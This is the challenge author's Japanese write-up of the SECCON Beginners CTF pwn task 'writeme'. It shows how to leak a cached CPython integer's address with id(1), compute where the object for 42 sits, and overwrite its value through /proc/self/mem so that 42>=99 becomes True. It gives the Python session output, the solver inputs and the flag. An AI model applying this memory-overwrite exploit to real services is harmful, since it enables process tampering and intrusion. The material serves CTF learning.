# writeme

## 問題文
writeme.  
(A little pwn)  
`nc writeme.quals.beginners.seccon.jp 27182`  
[writeme.tar.gz](files/writeme.tar.gz) 6fed82490d18ce779247e47a6d89efb2e52e753c  

## 難易度
**Medium**  

## 作問にあたって
CPythonの整数がキャッシュされることを知って思いついた問題です。  
/proc/self/memを書き換えるのはreadmeリスペクト。  
writeme.は実は正規表現でwrite`mem`を示しています(白目)。  
論理の飛躍もなく、作問者の中でも解けている人がいたので難易度は許容範囲だと思っています(Hardには少し弱い気がしました)。  

## 解法
ソースを読むと、存在するファイルに文字列`Hack`を挿入できるサービスが動いている。  
最初にChanceと称するevalがあるが`42=99`などはできないので後々使うことを考えておく。  
方針としてflagファイルに文字列を挿入し読み取る、もしくは`42>=99`をTrueとすることを目指す。  
flagファイルに文字列を挿入するのは、ファイル名がチェックされており難しそうであるので後者のアプローチを考える。  
任意のファイルに文字列挿入ができるので、`/proc/self/mem`を書き換え可能であり、場所は不明だが数値42もしくは99のオブジェクトの中身を破壊してやると`42>=99`がTrueとなると予測できる。  
ここでCPythonは32バイトずつ数値オブジェクトを順にキャッシュしていることを思い出す。  
Chanceの5文字のevalで行えることはidくらいしかないことから、それを用いることを思考の始まりとしても上記のアプローチに落ち着くと思われる(Congrats!とかあるし)。  
id(1)により無事に数値1のアドレスがリークできるので、id(1)+41*32で書き換える先のid(42)を求める。  
実際32バイトは以下のように求めることができる。  
```python
>>> int(id(2))-int(id(1))
32
>>> (int(id(42))-int(id(1)))/41
32.0
```
ちなみに大きいものはそうでもない。  
```python
>>> (int(id(124))-int(id(123)))
32
>>> (int(id(1235))-int(id(1234)))
-67072224
```
seekで先ほどリークしたアドレス分スキップすることで数値42を改造できる。  
```python
>>> fd = open("/proc/self/mem", "rb")
>>> fd.seek(int(id(42)))
10915808
>>> fd.read(32)
b'\x05\x00\x00\x00\x00\x00\x00\x00\x80\xd1\x9c\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00*\x00\x00\x00\x00\x00\x00\x00'
>>> fd.read(32)
b'\x05\x00\x00\x00\x00\x00\x00\x00\x80\xd1\x9c\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00+\x00\x00\x00\x00\x00\x00\x00'
>>> fd.read(32)
b'\x05\x00\x00\x00\x00\x00\x00\x00\x80\xd1\x9c\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00,\x00\x00\x00\x00\x00\x00\x00'
>>> fd.read(32)
b'\x05\x00\x00\x00\x00\x00\x00\x00\x80\xd1\x9c\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00-\x00\x00\x00\x00\x00\x00\x00'
>>> ord("*")
42
>>> ord("+")
43
>>> ord(",")
44
>>> ord("-")
45
```
どうやら25バイト目に数値本体が入っているようだ。  
ここを破壊してやれば`42>=99`をTrueにすることができそうだ。  
```python
>>> fd = open("/proc/self/mem", "rb+")
>>> fd.seek(int(id(42)))
10915808
>>> fd.read(32)
b'\x05\x00\x00\x00\x00\x00\x00\x00\x80\xd1\x9c\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00*\x00\x00\x00\x00\x00\x00\x00'
>>> fd.seek(int(id(42))+24)
10915832
>>> fd.write(b"A")
1
>>> fd.flush()
>>> fd.seek(int(id(42)))
10915808
>>> fd.read(32)
b'\x05\x00\x00\x00\x00\x00\x00\x00\x80\xd1\x9c\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00A\x00\x00\x00\x00\x00\x00\x00'
>>> 42
65
>>> chr(65)
'A'
```
+24seekすればよい。  
挿入される文字列が`Hack`であるため、99より大きくなる。  
```python
>>> fd = open("/proc/self/mem", "rb+")
>>> fd.seek(int(id(42)))
10915808
>>> fd.read(32)
b'\x05\x00\x00\x00\x00\x00\x00\x00\x80\xd1\x9c\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00*\x00\x00\x00\x00\x00\x00\x00'
>>> fd.seek(int(id(42))+24)
10915832
>>> fd.write(b"Hack")
4
>>> fd.seek(int(id(42)))
10915808
>>> fd.read(32)
b'\x05\x00\x00\x00\x00\x00\x00\x00\x80\xd1\x9c\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00Hack\x00\x00\x00\x00'
>>> fd.flush()
>>> 42
1801675080
>>> hex(1801675080)
'0x6b636148'
>>> hex(ord("H"))
'0x48'
>>> hex(ord("a"))
'0x61'
>>> hex(ord("c"))
'0x63'
>>> hex(ord("k"))
'0x6b'
>>> 42>=99
True
```
よって解法は以下の入力になる。  
```text
id(1)
/proc/self/mem
id(1)の結果 + 41*32 + 24
```
solverを書いてやればよい。  
```bash
$ python solver.py
140601518577968
140601518579304
ctf4b{r36ul4r_3xpr35510n_f0r_4ny_51n6l3_ch4r4c73r}
```

## ctf4b{r36ul4r_3xpr35510n_f0r_4ny_51n6l3_ch4r4c73r}
